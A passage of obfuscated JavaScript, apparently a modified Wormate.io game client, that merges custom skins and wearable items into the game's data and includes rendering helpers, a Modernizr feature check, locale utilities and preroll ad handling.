              _0x5322ca.glow.push("a_white");
            }
            for (let _0x226e28 = 0; _0x226e28 < _0x5322ca.glow.length; _0x226e28++) {
              if (!_0x5322ca.glow[_0x226e28] || !_0x5322ca.glow[_0x226e28].startsWith("a_") && !_0x5322ca.glow[_0x226e28].startsWith("a__") && !_0x5322ca.glow[_0x226e28].startsWith("a___") && !_0x5322ca.glow[_0x226e28].startsWith("at_") && !_0x5322ca.glow[_0x226e28].startsWith("at__") && !_0x5322ca.glow[_0x226e28].startsWith("at___")) {
                _0x5322ca.glow[_0x226e28] = "a_white";
              }
            }
            let _0x3df97d = -1;
            for (let _0x340551 = 0; _0x340551 < _0x9e3793.skinArrayDict.length; _0x340551++) {
              if (_0x9e3793.skinArrayDict[_0x340551].id === _0x5322ca.id) {
                _0x3df97d = _0x340551;
                break;
              }
            }
            if (_0x3df97d >= 0) {
              _0x9e3793.skinArrayDict[_0x3df97d] = _0x5322ca;
            } else {
              _0x9e3793.skinArrayDict.push(_0x5322ca);
            }
            if (!_0x34c740.list.includes(_0x5322ca.id)) {
              _0x34c740.list.push(_0x5322ca.id);
            }
          }
        }
      });
      if (_0x34c740.list.length > 0) {
        let _0xfb881f = false;
        for (let _0x58e793 = 0; _0x58e793 < _0x9e3793.skinGroupArrayDict.length; _0x58e793++) {
          if (_0x9e3793.skinGroupArrayDict[_0x58e793].id === _0x34c740.id) {
            _0x9e3793.skinGroupArrayDict[_0x58e793] = _0x34c740;
            _0xfb881f = true;
            break;
          }
        }
        if (!_0xfb881f) {
          _0x9e3793.skinGroupArrayDict.push(_0x34c740);
        }
      }
    } catch (_0x35b0c2) {
      console.error("❌ خطأ في معالجة النظام الجديد للسكنات:", _0x35b0c2);
      console.error("Stack trace:", _0x35b0c2.stack);
    }
  };
  _0x498743.validateSkinData = function (_0x55ef5a) {
    let _0xb26dd7 = [];
    Object.keys(_0x55ef5a.regionDict).forEach(function (_0x4e1430) {
      const _0x246663 = _0x55ef5a.regionDict[_0x4e1430];
      if (_0x246663.texture && !_0x55ef5a.textureDict[_0x246663.texture]) {
        _0xb26dd7.push("منطقة " + _0x4e1430 + " تشير لنسيج غير موجود: " + _0x246663.texture);
      }
    });
    _0x55ef5a.skinArrayDict.forEach(function (_0x27ba1a, _0x23b810) {
      if (_0x27ba1a.base && Array.isArray(_0x27ba1a.base)) {
        _0x27ba1a.base.forEach(function (_0x1f497d) {
          if (!_0x55ef5a.regionDict[_0x1f497d]) {
            _0xb26dd7.push("سكن " + _0x27ba1a.id + " يشير لمنطقة غير موجودة: " + _0x1f497d);
          }
        });
      }
    });
    if (_0xb26dd7.length > 0) {
      console.warn("⚠️ تم اكتشاف مشاكل في البيانات:");
      _0xb26dd7.forEach(function (_0x1b048e, _0x598b9b) {
        console.warn(_0x598b9b + 1 + ". " + _0x1b048e);
      });
    } else {
      console.log("✅ جميع البيانات سليمة!");
    }
    return _0xb26dd7;
  };
  _0x498743.processNewWearFormat = function (_0x3348e1, _0x2efbc0) {
    try {
      if (!_0x2efbc0.textureDict) {
        _0x2efbc0.textureDict = {};
      }
      if (!_0x2efbc0.regionDict) {
        _0x2efbc0.regionDict = {};
      }
      if (!_0x2efbc0.hatDict) {
        _0x2efbc0.hatDict = {};
      }
      if (!_0x2efbc0.eyesDict) {
        _0x2efbc0.eyesDict = {};
      }
      if (!_0x2efbc0.mouthDict) {
        _0x2efbc0.mouthDict = {};
      }
      if (!_0x2efbc0.glassesDict) {
        _0x2efbc0.glassesDict = {};
      }
      if (!_0x2efbc0.hatVariantArray) {
        _0x2efbc0.hatVariantArray = [];
      }
      if (!_0x2efbc0.eyesVariantArray) {
        _0x2efbc0.eyesVariantArray = [];
      }
      if (!_0x2efbc0.mouthVariantArray) {
        _0x2efbc0.mouthVariantArray = [];
      }
      if (!_0x2efbc0.glassesVariantArray) {
        _0x2efbc0.glassesVariantArray = [];
      }
      Object.keys(_0x3348e1).forEach(function (_0x19ce4c) {
        if (_0x19ce4c.startsWith("custom_wear_") && _0x3348e1[_0x19ce4c].wear) {
          const _0x5786f9 = _0x3348e1[_0x19ce4c].wear;
          if (_0x5786f9.textureDict) {
            Object.keys(_0x5786f9.textureDict).forEach(function (_0x305c72) {
              const _0x1b9b51 = _0x5786f9.textureDict[_0x305c72];
              if (_0x1b9b51 && _0x1b9b51.file) {
                let _0x53ddaa = _0x1b9b51.file;
                if (!_0x53ddaa.startsWith("data:image/")) {
                  _0x53ddaa = _0x53ddaa.replace(/\s/g, "");
                  _0x53ddaa = "data:image/png;base64," + _0x53ddaa;
                }
                _0x2efbc0.textureDict[_0x305c72] = {
                  custom: true,
                  h1: true,
                  h4: true,
                  file: _0x53ddaa,
                  relativePath: _0x53ddaa
                };
              }
            });
          }
          if (_0x5786f9.regionDict) {
            Object.keys(_0x5786f9.regionDict).forEach(function (_0x640cb5) {
              const _0x2ad534 = _0x5786f9.regionDict[_0x640cb5];
              if (_0x2ad534 && _0x2ad534.id && _0x2ad534.obj && _0x2ad534.list) {
                const _0x1ef5ad = _0x2ad534.list;
                const _0x43cdf4 = _0x2ad534.listVariant || _0x1ef5ad.replace("Dict", "VariantArray");
                if (!_0x2efbc0[_0x1ef5ad]) {
                  _0x2efbc0[_0x1ef5ad] = {};
                }
                if (!_0x2efbc0[_0x43cdf4]) {
                  _0x2efbc0[_0x43cdf4] = [];
                }
                _0x2efbc0.regionDict[_0x640cb5] = {
                  texture: _0x2ad534.texture,
                  x: _0x2ad534.x || 0,
                  y: _0x2ad534.y || 0,
                  w: _0x2ad534.w || 128,
                  h: _0x2ad534.h || 128,
                  px: _0x2ad534.px || 0,
                  py: _0x2ad534.py || 0,
                  pw: _0x2ad534.pw || 128,
                  ph: _0x2ad534.ph || 128
                };
                const _0xbec85f = _0x2ad534.id;
                _0x2efbc0[_0x1ef5ad][_0xbec85f] = {
                  base: _0x2ad534.obj.base || [{
                    region: _0x640cb5
                  }],
                  guest: _0x2ad534.obj.guest !== undefined ? _0x2ad534.obj.guest : true,
                  price: _0x2ad534.obj.price || 0,
                  priceBefore: _0x2ad534.obj.priceBefore || 0,
                  nonbuyable: _0x2ad534.obj.nonbuyable !== undefined ? _0x2ad534.obj.nonbuyable : false,
                  prime: _0x2ad534.obj.prime || "c_white",
                  custom: true,
                  newSystem: true
                };
                if (!_0x2efbc0[_0x43cdf4].some(_0x5f5969 => _0x5f5969[0] === _0xbec85f)) {
                  _0x2efbc0[_0x43cdf4].push([_0xbec85f]);
                }
                let _0x31b492 = _0x1ef5ad.replace("Dict", "");
                if (_0x1ef5ad === "hatDict") {
                  _0x31b492 = "قبعة";
                } else if (_0x1ef5ad === "eyesDict") {
                  _0x31b492 = "عيون";
                } else if (_0x1ef5ad === "mouthDict") {
                  _0x31b492 = "فم";
                } else if (_0x1ef5ad === "glassesDict") {
                  _0x31b492 = "نظارة";
                }
                console.log("✅ تم إضافة " + _0x31b492 + " جديد:", _0xbec85f);
              } else {
                console.warn("⚠️ منطقة غير مكتملة:", _0x640cb5, _0x2ad534);
              }
            });
          }
        }
      });
      setTimeout(() => {
        if (window._wup?._anApp?.og?.af?.ng) {
          try {
            const _0x1dca88 = window._wup._anApp.og.af.ng;
            if (_0x1dca88.Ug && _0x1dca88.Ug.Uf) {
              _0x1dca88.Ug.Uf(_0x2efbc0);
              console.log("✅ تم تحديث واجهة الأزياء!");
            }
          } catch (_0x1d8720) {
            console.log("تجربة تحديث:", _0x1d8720.message);
          }
        }
        if (window.gameManager) {
          Object.assign(window.gameManager, _0x2efbc0);
        }
        if (window.gameInstance?.Lc) {
          window.gameInstance.Lc.Gb = _0x2efbc0;
        }
      }, 500);
    } catch (_0x100758) {
      console.error("❌ خطأ في معالجة النظام الجديد للأزياء:", _0x100758);
      console.error("Stack trace:", _0x100758.stack);
    }
  };
  function _0x5b6ed7(_0x4c31c6, _0x4c8665) {
    const _0x4902d8 = _0x4c31c6.toLowerCase();
    if (_0x4902d8.includes("eye") || _0x4902d8.includes("عين") || _0x4902d8.includes("pupil") || _0x4902d8.includes("iris")) {
      return "eyes";
    }
    if (_0x4902d8.includes("mouth") || _0x4902d8.includes("فم") || _0x4902d8.includes("lip") || _0x4902d8.includes("smile")) {
      return "mouth";
    }
    if (_0x4902d8.includes("hat") || _0x4902d8.includes("قبعة") || _0x4902d8.includes("cap") || _0x4902d8.includes("helm")) {
      return "hat";
    }
    if (_0x4902d8.includes("glass") || _0x4902d8.includes("نظارة") || _0x4902d8.includes("goggle") || _0x4902d8.includes("spec")) {
      return "glasses";
    }
    if (_0x4c8665 && _0x4c8665.y !== undefined) {
      if (_0x4c8665.y < 40) {
        return "hat";
      }
      if (_0x4c8665.y > 90) {
        return "mouth";
      }
      return "eyes";
    }
    return "eyes";
  }
  _0x498743.bgg = function (_0x3acb8e) {
    _0x3acb8e = parseInt(_0x3acb8e);
    var _0x2aed33 = vps.backgroundUri || "/images/bg-pattern-pow2-ARENA.png";
    if (!isNaN(_0x3acb8e)) {
      _0x2aed33 = backgroundArena[_0x3acb8e]?.uri || _0x2aed33;
      vps.bgGameWidth = backgroundArena[_0x3acb8e]?.w || 512;
      vps.bgGameHeight = backgroundArena[_0x3acb8e]?.h || 256;
    }
    var _0x49c437 = PIXI.BaseTexture.from(_0x2aed33);
    vps.bgGameWidth = _0x49c437.width || vps.bgGameWidth || 512;
    vps.bgGameHeight = _0x49c437.height || vps.bgGameHeight || 256;
    _0x49c437.wrapMode = vps.bgGameWidth > 999 ? PIXI.WRAP_MODES.CLAMP : PIXI.WRAP_MODES.REPEAT;
    return new PIXI.Texture(_0x49c437);
  };
  _0x498743.genereteTexture = function (_0x1e4f26) {
    var _0xe17000 = 128;
    var _0x4ab45c = 9;
    try {
      var _0x3ba146 = function _0x3f210c() {
        var _0xd16b05 = [];
        for (var _0x20163e = 0; _0x20163e < _0x1e4f26.lines; _0x20163e++) {
          lineContainer = [];
          for (var _0x2e0504 = 0; _0x2e0504 < _0x4ab45c; _0x2e0504++) {
            try {
              var _0x177a31 = PIXI.Texture.from(_0x1e4f26._d, {
                x: _0x2e0504 * _0xe17000,
                y: _0x20163e * _0xe17000,
                width: _0xe17000,
                height: _0xe17000
              });
              lineContainer.push(_0x177a31);
            } catch (_0x5e8646) {
              console.log(_0x20163e, _0x2e0504);
              console.log(_0x5e8646);
              return;
            }
          }
          _0xd16b05.push(lineContainer);
        }
        return _0xd16b05;
      };
      return _0x3ba146();
    } catch (_0x11948b) {
      return [];
    }
  };
  var _0x4090ae = typeof Symbol == "function" && _0x185438(Symbol.iterator) == "symbol" ? function (_0x313b9c) {
    return _0x185438(_0x313b9c);
  } : function (_0x35c60d) {
    if (_0x35c60d && typeof Symbol == "function" && _0x35c60d.constructor === Symbol && _0x35c60d !== Symbol.prototype) {
      return "symbol";
    } else {
      return _0x185438(_0x35c60d);
    }
  };
  var _0x39075e;
  window.addEventListener("load", function () {
    function _0x5ef043() {
      (function (_0x5aeb96, _0x18711b, _0x55cc6d) {
        function _0x551fd7(_0x21c0f3, _0x5d7bb9) {
          return (_0x21c0f3 === undefined ? "undefined" : _0x4090ae(_0x21c0f3)) === _0x5d7bb9;
        }
        function _0x2e9b8e() {
          if (typeof _0x18711b.createElement != "function") {
            return _0x18711b.createElement(arguments[0]);
          } else if (_0x4ae596) {
            return _0x18711b.createElementNS.call(_0x18711b, "http://www.w3.org/2000/svg", arguments[0]);
          } else {
            return _0x18711b.createElement.apply(_0x18711b, arguments);
          }
        }
        var _0x3eb76d = [];
        var _0x3a8142 = [];
        var _0x55e587 = {
          _version: "3.3.1",
          _config: {
            classPrefix: "",
            enableClasses: true,
            enableJSClass: true,
            usePrefixes: true
          },
          _q: [],
          on: function _0x504db4(_0x326904, _0x562709) {
            var _0x3f3ccc = this;
            setTimeout(function () {
              _0x562709(_0x3f3ccc[_0x326904]);
            }, 0);
          },
          addTest: function _0x14e272(_0x5202f7, _0x4d9900, _0x1ad336) {
            _0x3a8142.push({
              name: _0x5202f7,
              fn: _0x4d9900,
              options: _0x1ad336
            });
          },
          addAsyncTest: function _0x25f26f(_0x3dab85) {
            _0x3a8142.push({
              name: null,
              fn: _0x3dab85
            });
          }
        };
        var _0xba3c6 = function _0x101b1e() {};
        _0xba3c6.prototype = _0x55e587;
        _0xba3c6 = new _0xba3c6();
        var _0x218a31 = false;
        try {
          _0x218a31 = "WebSocket" in _0x5aeb96 && _0x5aeb96.WebSocket.CLOSING === 2;
        } catch (_0x3c1a75) {}
        _0xba3c6.addTest("websockets", _0x218a31);
        var _0x2b2b78 = _0x18711b.documentElement;
        var _0x4ae596 = _0x2b2b78.nodeName.toLowerCase() === "svg";
        _0xba3c6.addTest("canvas", function () {
          var _0x959d88 = _0x2e9b8e("canvas");
          return !!_0x959d88.getContext && !!_0x959d88.getContext("2d");
        });
        _0xba3c6.addTest("canvastext", function () {
          return _0xba3c6.canvas !== false && typeof _0x2e9b8e("canvas").getContext("2d").fillText == "function";
        });
        (function () {
          var _0x1d66fc;
          var _0x9b222f;
          var _0xf0c7d3;
          var _0xeff1cd;
          var _0x32e8e8;
          var _0x52fa3b;
          var _0x3f34bf;
          for (var _0x5009a4 in _0x3a8142) {
            if (_0x3a8142.hasOwnProperty(_0x5009a4)) {
              _0x1d66fc = [];
              _0x9b222f = _0x3a8142[_0x5009a4];
              if (_0x9b222f.name && (_0x1d66fc.push(_0x9b222f.name.toLowerCase()), _0x9b222f.options && _0x9b222f.options.aliases && _0x9b222f.options.aliases.length)) {
                for (_0xf0c7d3 = 0; _0xf0c7d3 < _0x9b222f.options.aliases.length; _0xf0c7d3++) {
                  _0x1d66fc.push(_0x9b222f.options.aliases[_0xf0c7d3].toLowerCase());
                }
              }
              _0xeff1cd = _0x551fd7(_0x9b222f.fn, "function") ? _0x9b222f.fn() : _0x9b222f.fn;
              _0x32e8e8 = 0;
              for (; _0x32e8e8 < _0x1d66fc.length; _0x32e8e8++) {
                _0x52fa3b = _0x1d66fc[_0x32e8e8];
                _0x3f34bf = _0x52fa3b.split(".");
                if (_0x3f34bf.length === 1) {
                  _0xba3c6[_0x3f34bf[0]] = _0xeff1cd;
                } else {
                  if (!!_0xba3c6[_0x3f34bf[0]] && !(_0xba3c6[_0x3f34bf[0]] instanceof Boolean)) {
                    _0xba3c6[_0x3f34bf[0]] = new Boolean(_0xba3c6[_0x3f34bf[0]]);
                  }
                  _0xba3c6[_0x3f34bf[0]][_0x3f34bf[1]] = _0xeff1cd;
                }
                _0x3eb76d.push((_0xeff1cd ? "" : "no-") + _0x3f34bf.join("-"));
              }
            }
          }
        })();
        (function (_0x4758eb) {
          var _0x36eab9 = _0x2b2b78.className;
          var _0x5a6723 = _0xba3c6._config.classPrefix || "";
          if (_0x4ae596) {
            _0x36eab9 = _0x36eab9.baseVal;
          }
          if (_0xba3c6._config.enableJSClass) {
            var _0x500a94 = new RegExp("(^|\\s)" + _0x5a6723 + "no-js(\\s|$)");
            _0x36eab9 = _0x36eab9.replace(_0x500a94, "$1" + _0x5a6723 + "js$2");
          }
          if (_0xba3c6._config.enableClasses) {
            _0x36eab9 += " " + _0x5a6723 + _0x4758eb.join(" " + _0x5a6723);
            if (_0x4ae596) {
              _0x2b2b78.className.baseVal = _0x36eab9;
            } else {
              _0x2b2b78.className = _0x36eab9;
            }
          }
        })(_0x3eb76d);
        delete _0x55e587.addTest;
        delete _0x55e587.addAsyncTest;
        for (var _0x1b332a = 0; _0x1b332a < _0xba3c6._q.length; _0x1b332a++) {
          _0xba3c6._q[_0x1b332a]();
        }
        _0x5aeb96.Modernizr = _0xba3c6;
      })(window, document);
      return Modernizr.websockets && Modernizr.canvas && Modernizr.canvastext;
    }
    document.getElementById("game-wrap").style.display = "block";
    if (!_0x5ef043()) {
      document.getElementById("error-view").style.display = "block";
      return;
    }
    (function () {
      function _0xf1d21a() {
        return _0x3b6ea9;
      }
      var _0x1c97c7 = {};
      var _0x1525ec = {};
      var _0x503ed4 = {
        a: {
          r: window.runtimeHash,
          b: "https://gateway.wormate.io",
          c: "https://resources.wormate.io",
          d: "/images/linelogo-valday2024.png",
          e: "/images/guest-avatar-valday2025.png",
          f: "/images/confetti-valday2025.png",
          g: "/images/bg-event-pattern-valday2025.png"
        }
      };
      _0x503ed4.a.i = function () {
        var _0xf8aeac = window.I18N_LANG;
        _0xf8aeac ||= "en";
        return _0xf8aeac;
      }();
      _0x503ed4.a.j = function () {
        var _0x4840a9 = undefined;
        switch (_0x503ed4.a.i) {
          case "uk":
            _0x4840a9 = "uk_UA";
            break;
          case "de":
            _0x4840a9 = "de_DE";
            break;
          case "fr":
            _0x4840a9 = "fr_FR";
            break;
          case "es":
            _0x4840a9 = "es_ES";
            break;
          default:
            _0x4840a9 = "en_US";
        }
        return _0x4840a9;
      }();
      moment.locale(_0x503ed4.a.j);
      var _0x32defb = function () {
        return {
          Container: PIXI.Container,
          BaseTexture: PIXI.BaseTexture,
          Texture: PIXI.Texture,
          Renderer: PIXI.Renderer,
          Graphics: PIXI.Graphics,
          Shader: PIXI.Shader,
          Rectangle: PIXI.Rectangle,
          Sprite: PIXI.Sprite,
          Text: PIXI.Text,
          Geometry: PIXI.Geometry,
          Mesh: PIXI.Mesh,
          v: {
            z: PIXI.BLEND_MODES.ADD,
            A: PIXI.BLEND_MODES.SCREEN,
            B: PIXI.BLEND_MODES.MULTIPLY
          },
          C: {
            D: PIXI.WRAP_MODES.REPEAT
          }
        };
      }();
      _0x1525ec.F = 6.283185307179586;
      _0x1525ec.G = Math.PI;
      _0x503ed4.H = function (_0x4d0606) {
        return window.I18N_MESSAGES[_0x4d0606];
      };
      _0x503ed4.I = function (_0x59e29c) {
        if (_0x59e29c[_0x503ed4.a.i]) {
          return _0x59e29c[_0x503ed4.a.i];
        } else if (_0x59e29c.en) {
          return _0x59e29c.en;
        } else {
          return _0x59e29c.x;
        }
      };
      _0x503ed4.J = function (_0x5084c0) {
        var _0x1e238d = (Math.floor(_0x5084c0) % 60).toString();
        var _0x1f8dbb = (Math.floor(_0x5084c0 / 60) % 60).toString();
        var _0x204026 = (Math.floor(_0x5084c0 / 3600) % 24).toString();
        var _0x31cf7e = Math.floor(_0x5084c0 / 86400).toString();
        var _0x498beb = _0x503ed4.H("util.time.days");
        var _0x4778df = _0x503ed4.H("util.time.hours");
        var _0x47836d = _0x503ed4.H("util.time.min");
        var _0x453189 = _0x503ed4.H("util.time.sec");
        if (_0x31cf7e > 0) {
          return _0x31cf7e + " " + _0x498beb + " " + _0x204026 + " " + _0x4778df + " " + _0x1f8dbb + " " + _0x47836d + " " + _0x1e238d + " " + _0x453189;
        } else if (_0x204026 > 0) {
          return _0x204026 + " " + _0x4778df + " " + _0x1f8dbb + " " + _0x47836d + " " + _0x1e238d + " " + _0x453189;
        } else if (_0x1f8dbb > 0) {
          return _0x1f8dbb + " " + _0x47836d + " " + _0x1e238d + " " + _0x453189;
        } else {
          return _0x1e238d + " " + _0x453189;
        }
      };
      _0x503ed4.K = function (_0x463d93) {
        if (_0x463d93.includes("href")) {
          return _0x463d93.replaceAll("href", "target=\"_black\" href");
        } else {
          return _0x463d93;
        }
      };
      _0x503ed4.L = function (_0x1dbff2, _0x6cfc46, _0x1d3166, _0x53c035) {
        var _0x3ddeaa = document.createElement("script");
        var _0x5e4cd9 = true;
        if (_0x4090ae(_0x6cfc46) !== "undefined" && _0x6cfc46 !== null) {
          if (_0x4090ae(_0x6cfc46.id) !== "undefined") {
            _0x3ddeaa.id = _0x6cfc46.id;
          }
          if (_0x4090ae(_0x6cfc46.async) !== "undefined" && _0x6cfc46.async) {
            _0x3ddeaa.async = "async";
          }
          if (_0x4090ae(_0x6cfc46.defer) !== "undefined" && _0x6cfc46.defer) {
            _0x3ddeaa.defer = "defer";
          }
          if (_0x4090ae(_0x6cfc46.crossorigin) !== "undefined") {
            _0x3ddeaa.crossorigin = _0x6cfc46.crossorigin;
          }
        }
        _0x3ddeaa.type = _0x3ddeaa.type == _0x53c035 ? "module" : "text/javascript";
        _0x3ddeaa.src = _0x1dbff2;
        if (_0x1d3166) {
          _0x3ddeaa.onload = _0x3ddeaa.onreadystatechange = function () {
            _0x5e4cd9 = false;
            try {
              _0x1d3166();
            } catch (_0x55a902) {}
            _0x3ddeaa.onload = _0x3ddeaa.onreadystatechange = null;
          };
        }
        (document.head || document.getElementsByTagName("head")[0]).appendChild(_0x3ddeaa);
      };
      _0x503ed4.M = function (_0x148ffc, _0x5edd25) {
        var _0x3182d8 = _0x5edd25;
        _0x3182d8.prototype = Object.create(_0x148ffc.prototype);
        _0x3182d8.prototype.constructor = _0x3182d8;
        _0x3182d8.parent = _0x148ffc;
        return _0x3182d8;
      };
      _0x503ed4.N = function (_0x2ab002) {
        _0x2ab002 %= _0x1525ec.F;
        if (_0x2ab002 < 0) {
          return _0x2ab002 + _0x1525ec.F;
        } else {
          return _0x2ab002;
        }
      };
      _0x503ed4.O = function (_0x32b3ee, _0x3ad6ab, _0x1d15b5) {
        return _0x503ed4.P(_0x1d15b5, _0x32b3ee, _0x3ad6ab);
      };
      _0x503ed4.P = function (_0x7b0566, _0x2fe024, _0x131d84) {
        if (_0x7b0566 > _0x131d84) {
          return _0x131d84;
        } else if (_0x7b0566 < _0x2fe024) {
          return _0x2fe024;
        } else if (Number.isFinite(_0x7b0566)) {
          return _0x7b0566;
        } else {
          return (_0x2fe024 + _0x131d84) * 0.5;
        }
      };
      _0x503ed4.Q = function (_0x472df2, _0x33a810, _0x191c60, _0x43c104) {
        if (_0x33a810 > _0x472df2) {
          return Math.min(_0x33a810, _0x472df2 + _0x191c60 * _0x43c104);
        } else {
          return Math.max(_0x33a810, _0x472df2 - _0x191c60 * _0x43c104);
        }
      };
      _0x503ed4.R = function (_0x446fd6, _0x36da56, _0x4d39b2, _0x382617, _0x2bca0b) {
        return _0x36da56 + (_0x446fd6 - _0x36da56) * Math.pow(1 - _0x382617, _0x4d39b2 / _0x2bca0b);
      };
      _0x503ed4.S = function (_0x469af2, _0x5c5d75, _0x2f999f) {
        return _0x469af2 - (_0x469af2 - _0x5c5d75) * _0x2f999f;
      };
      _0x503ed4.T = function (_0x52fc0b, _0x4d472d, _0x29b3e4, _0x321335) {
        var _0x506321 = _0x29b3e4;
        var _0x4ff9dd = _0x4d472d;
        var _0x5acb05 = _0x4d472d + _0x321335;
        if (_0x52fc0b == null) {
          throw new TypeError("this is null or not defined");
        }
        var _0x33f5c6 = _0x52fc0b.length >>> 0;
        var _0x31e98c = _0x506321 >> 0;
        var _0x1baae8 = _0x31e98c < 0 ? Math.max(_0x33f5c6 + _0x31e98c, 0) : Math.min(_0x31e98c, _0x33f5c6);
        var _0x2c3054 = _0x4ff9dd >> 0;
        var _0x4e984a = _0x2c3054 < 0 ? Math.max(_0x33f5c6 + _0x2c3054, 0) : Math.min(_0x2c3054, _0x33f5c6);
        var _0x1803bb = _0x5acb05 === undefined ? _0x33f5c6 : _0x5acb05 >> 0;
        var _0x1d447c = _0x1803bb < 0 ? Math.max(_0x33f5c6 + _0x1803bb, 0) : Math.min(_0x1803bb, _0x33f5c6);
        var _0x227924 = Math.min(_0x1d447c - _0x4e984a, _0x33f5c6 - _0x1baae8);
        var _0x3cc835 = 1;
        for (_0x4e984a < _0x1baae8 && _0x1baae8 < _0x4e984a + _0x227924 && (_0x3cc835 = -1, _0x4e984a += _0x227924 - 1, _0x1baae8 += _0x227924 - 1); _0x227924 > 0;) {
          if (_0x4e984a in _0x52fc0b) {
            _0x52fc0b[_0x1baae8] = _0x52fc0b[_0x4e984a];
          } else {
            delete _0x52fc0b[_0x1baae8];
          }
          _0x4e984a += _0x3cc835;
          _0x1baae8 += _0x3cc835;
          _0x227924--;
        }
        return _0x52fc0b;
      };
      _0x503ed4.U = function (_0x537a93) {
        if (_0x537a93.parent != null) {
          _0x537a93.parent.removeChild(_0x537a93);
        }
      };
      _0x503ed4.V = function (_0x3487c4, _0x5d62d1) {
        return _0x3487c4 + (_0x5d62d1 - _0x3487c4) * Math.random();
      };
      _0x503ed4.W = function (_0x1ff9f2) {
        return _0x1ff9f2[parseInt(Math.random() * _0x1ff9f2.length)];
      };
      _0x503ed4.X = function () {
        return Math.random().toString(36).substring(2, 15);
      };
      _0x503ed4.Y = function (_0x209388, _0x32d5dc, _0x58882c) {
        var _0x1e00f9 = (1 - Math.abs(_0x58882c * 2 - 1)) * _0x32d5dc;
        var _0x290a59 = _0x1e00f9 * (1 - Math.abs(_0x209388 / 60 % 2 - 1));
        var _0x42998a = _0x58882c - _0x1e00f9 / 2;
        if (_0x209388 >= 0 && _0x209388 < 60) {
          return [_0x42998a + _0x1e00f9, _0x42998a + _0x290a59, _0x42998a + 0];
        } else if (_0x209388 >= 60 && _0x209388 < 120) {
          return [_0x42998a + _0x290a59, _0x42998a + _0x1e00f9, _0x42998a + 0];
        } else if (_0x209388 >= 120 && _0x209388 < 180) {
          return [_0x42998a + 0, _0x42998a + _0x1e00f9, _0x42998a + _0x290a59];
        } else if (_0x209388 >= 180 && _0x209388 < 240) {
          return [_0x42998a + 0, _0x42998a + _0x290a59, _0x42998a + _0x1e00f9];
        } else if (_0x209388 >= 240 && _0x209388 < 300) {
          return [_0x42998a + _0x290a59, _0x42998a + 0, _0x42998a + _0x1e00f9];
        } else {
          return [_0x42998a + _0x1e00f9, _0x42998a + 0, _0x42998a + _0x290a59];
        }
      };
      _0x503ed4.Z = function (_0x4a7488, _0x36ec65, _0x2f5035) {
        $.get(_0x4a7488).fail(_0x36ec65).done(_0x2f5035);
      };
      _0x503ed4.$ = function (_0x372c11, _0x10dd8f, _0x2a0f5c, _0x380254) {
        $.ajax({
          type: "GET",
          url: _0x372c11,
          xhrFields: {
            responseType: "arraybuffer",
            onprogress: function _0x4de5c5(_0x1517e1) {
              if (_0x1517e1.lengthComputable) {
                _0x380254(_0x1517e1.loaded / _0x1517e1.total * 100);
              }
            }
          }
        }).fail(_0x10dd8f).done(_0x2a0f5c);
      };
      _0x503ed4._ = function (_0x26d9d4, _0x29509e) {
        for (var _0xbd4853 in _0x26d9d4) {
          if (_0x26d9d4.hasOwnProperty(_0xbd4853)) {
            _0x29509e(_0xbd4853, _0x26d9d4[_0xbd4853]);
          }
        }
      };
      _0x503ed4.aa = function (_0x2fcf3e) {
        for (var _0x1cfaed = _0x2fcf3e.length - 1; _0x1cfaed > 0; _0x1cfaed--) {
          var _0x5bfd05 = Math.floor(Math.random() * (_0x1cfaed + 1));
          var _0x1bf580 = _0x2fcf3e[_0x1cfaed];
          _0x2fcf3e[_0x1cfaed] = _0x2fcf3e[_0x5bfd05];
          _0x2fcf3e[_0x5bfd05] = _0x1bf580;
        }
        return _0x2fcf3e;
      };
      (function () {
        var _0x2d5d14 = 0;
        try {
          DataView.prototype.ba = function (_0x486039) {
            try {
              _0x2d5d14 = _0x486039;
              return this.getInt8(_0x486039);
            } catch (_0x3a597f) {
              console.log(_0x2d5d14);
              _0x3b6ea9.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.ca = function (_0x6994c4) {
            try {
              _0x2d5d14 = _0x6994c4;
              return this.getInt16(_0x6994c4);
            } catch (_0x4b0856) {
              console.log(_0x2d5d14);
              _0x3b6ea9.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.da = function (_0x1830d2) {
            try {
              _0x2d5d14 = _0x1830d2;
              return this.getInt32(_0x1830d2);
            } catch (_0x126dfb) {
              console.log(_0x2d5d14);
              _0x3b6ea9.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.ea = function (_0x54b0fa) {
            try {
              _0x2d5d14 = _0x54b0fa;
              return this.getFloat32(_0x54b0fa);
            } catch (_0x51e8e9) {
              console.log(_0x2d5d14);
              _0x3b6ea9.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.fa = function (_0x11671b) {
            try {
              _0x2d5d14 = _0x11671b;
              return this.getFloat64(_0x11671b);
            } catch (_0x206973) {
              console.log(_0x2d5d14);
              _0x3b6ea9.dh.mq.close();
              return 0;
            }
          };
        } catch (_0x204a14) {
          console.log(_0x2d5d14);
          console.error("Error adding methods to DataView prototype:", _0x204a14);
        }
      })();
      _0x503ed4.ga = function () {
        function _0x3b044c() {
          if (window.vps.s_l) {
            try {
              ga("send", "event", "antiadblocker", window.runtimeHash + "_complete");
            } catch (_0x3f622b) {}
            _0x1b94ce(true);
          }
        }
        var _0x57f07f = false;
        var _0x1b94ce = function _0x4ea8a9() {};
        var _0x33de06 = {};
        var _0x1a784f = "JDHnkHtYwyXyVgG9";
        $("#adbl-continue").click(function () {
          $("#" + _0x1a784f).fadeOut(500);
          _0x1b94ce(false);
        });
        _0x33de06.ha = function (_0x3f5a86) {
          _0x1b94ce = _0x3f5a86;
          if (!_0x57f07f) {
            try {
              aiptag.cmd.player.push(function () {
                aiptag.adplayer = new aipPlayer({
                  AD_WIDTH: 960,
                  AD_HEIGHT: 540,
                  AD_FULLSCREEN: true,
                  AD_CENTERPLAYER: false,
                  LOADING_TEXT: "loading advertisement",
                  PREROLL_ELEM: function _0x513f54() {
                    return document.getElementById("1eaom01c3pxu9wd3");
                  },
                  AIP_COMPLETE: function _0x4aa665(_0x2cdc5f) {
                    _0x1b94ce(true);
                    $("#1eaom01c3pxu9wd3").hide();
                    $("#" + _0x1a784f).hide();
                    try {
                      ga("send", "event", "preroll", window.runtimeHash + "_complete");
                    } catch (_0x1083d4) {}
                  },
                  AIP_REMOVE: function _0xca9c86() {}
                });
              });
              _0x57f07f = true;
            } catch (_0x342158) {}
          }
        };
        _0x33de06.ia = function () {
          try {
            ga("send", "event", "antiadblocker", window.runtimeHash + "_start");
          } catch (_0x40afb9) {}
          _0x3b044c();
        };
        return _0x33de06;
      };
      _0x503ed4.ja = function (_0x5b7bce, _0x34b155) {
